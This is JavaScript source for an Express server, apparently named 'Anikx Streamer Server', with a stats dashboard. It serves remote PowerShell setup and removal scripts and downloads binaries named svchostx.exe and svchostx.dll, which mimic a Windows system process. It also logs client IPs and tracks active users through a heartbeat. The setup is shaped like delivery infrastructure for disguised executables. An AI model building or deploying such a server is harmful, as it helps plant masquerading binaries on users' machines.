// ============================================================
// Anikx Streamer Server (API + Web Dashboard)
// ============================================================

const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

// Database file
const DB_FILE = path.join(__dirname, 'database.json');

// Initialize database
function loadDB() {
    try {
        if (fs.existsSync(DB_FILE)) {
            return JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
        }
    } catch {}
    return {
        totalDownloads: 0,
        totalSetups: 0,
        totalRemoves: 0,
        activeUsers: [],
        dailyStats: {},
        recentActivity: []
    };
}

function saveDB(db) {
    try {
        fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2));
    } catch (err) {
        console.error('DB save error:', err.message);
    }
}

let db = loadDB();

// ============================================================
// Middleware
// ============================================================
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Logging
app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
    next();
});

// ============================================================
// HELPER: Get client info
// ============================================================
function getClientInfo(req) {
    const ip = req.headers['x-forwarded-for']?.split(',')[0] || 
               req.socket.remoteAddress || 
               'unknown';
    
    const ua = req.headers['user-agent'] || 'unknown';
    
    return { ip, ua, time: new Date().toISOString() };
}

function logActivity(req, action) {
    const info = getClientInfo(req);
    
    db.recentActivity.unshift({
        action: action,
        ip: info.ip,
        ua: info.ua.substring(0, 50),
        time: info.time
    });
    
    // Keep only last 20
    if (db.recentActivity.length > 20) {
        db.recentActivity = db.recentActivity.slice(0, 20);
    }
    
    // Daily stats
    const date = new Date().toISOString().split('T')[0];
    if (!db.dailyStats[date]) {
        db.dailyStats[date] = { setups: 0, removes: 0, exe: 0, dll: 0 };
    }
    
    saveDB(db);
}

// ============================================================
// ROOT - Serve Dashboard
// ============================================================
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ============================================================
// API: Get Stats
// ============================================================
app.get('/api/stats', (req, res) => {
    res.json({
        status: 'ok',
        stats: {
            totalDownloads: db.totalDownloads,
            totalSetups: db.totalSetups,
            totalRemoves: db.totalRemoves,
            activeUsers: db.activeUsers.length,
            dailyStats: db.dailyStats,
            recentActivity: db.recentActivity.slice(0, 10)
        }
    });
});

// ============================================================
// SETUP SCRIPT
// ============================================================
app.get('/setup.ps1', (req, res) => {
    try {
        db.totalSetups++;
        logActivity(req, 'SETUP');
        
        let script = fs.readFileSync(path.join(__dirname, 'scripts', 'setup.ps1'), 'utf8');
        const baseUrl = `${req.protocol}://${req.get('host')}`;
        script = script.replace(/https:\/\/REPLACE_ME/g, baseUrl);
        
        res.setHeader('Content-Type', 'text/plain; charset=utf-8');
        res.send(script);
    } catch (err) {
        res.status(500).send('# Error: ' + err.message);
    }
});

// ============================================================
// REMOVE SCRIPT
// ============================================================
app.get('/remove.ps1', (req, res) => {
    try {
        db.totalRemoves++;
        logActivity(req, 'REMOVE');
        
        const script = fs.readFileSync(path.join(__dirname, 'scripts', 'remove.ps1'), 'utf8');
        res.setHeader('Content-Type', 'text/plain; charset=utf-8');
        res.send(script);
    } catch (err) {
        res.status(500).send('# Error: ' + err.message);
    }
});

// ============================================================
// FILE DOWNLOAD
// ============================================================
app.get('/files/:filename', (req, res) => {
    try {
        const filename = req.params.filename;
        
        if (filename.includes('..')) return res.status(400).json({ error: 'Invalid' });
        
        const filepath = path.join(__dirname, 'files', filename);
        
        if (!fs.existsSync(filepath)) {
            return res.status(404).json({ error: 'Not found' });
        }
        
        db.totalDownloads++;
        logActivity(req, filename.endsWith('.exe') ? 'EXE' : 'DLL');
        
        const stats = fs.statSync(filepath);
        res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
        res.setHeader('Content-Type', 'application/octet-stream');
        res.sendFile(filepath);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ============================================================
// API: Register Active User (প্যানেল থেকে কল হবে)
// ============================================================
app.post('/api/heartbeat', (req, res) => {
    const info = getClientInfo(req);
    
    // Remove old entries (> 5 min)
    const now = Date.now();
    db.activeUsers = db.activeUsers.filter(u => now - new Date(u.time).getTime() < 300000);
    
    // Add/update current user
    db.activeUsers = db.activeUsers.filter(u => u.ip !== info.ip);
    db.activeUsers.push({ ip: info.ip, time: info.time });
    
    saveDB(db);
    res.json({ status: 'ok', activeUsers: db.activeUsers.length });
});

// ============================================================
// Start Server
// ============================================================
app.listen(PORT, () => {
    console.log('');
    console.log('=============================================');
    console.log('  Anikx Streamer Server');
    console.log('=============================================');
    console.log(`  Dashboard : http://localhost:${PORT}`);
    console.log(`  Setup     : /setup.ps1`);
    console.log(`  Remove    : /remove.ps1`);
    console.log(`  Files     : /files/svchostx.exe`);
    console.log(`              /files/svchostx.dll`);
    console.log(`  API       : /api/stats`);
    console.log('=============================================');
    console.log('');
});